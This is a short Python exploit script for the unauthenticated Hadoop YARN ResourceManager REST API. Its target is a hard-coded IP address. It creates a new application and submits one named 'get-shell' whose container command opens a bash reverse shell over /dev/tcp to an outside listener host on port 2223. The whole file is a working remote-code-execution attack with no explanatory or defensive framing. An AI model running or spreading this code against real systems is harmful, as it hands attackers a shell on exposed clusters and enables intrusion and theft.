import requests

target = 'http://59.110.225.225:8088/'
lhost = '49.234.105.212'

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
print(resp.text)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/2223 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
print(data)
requests.post(url, json=data)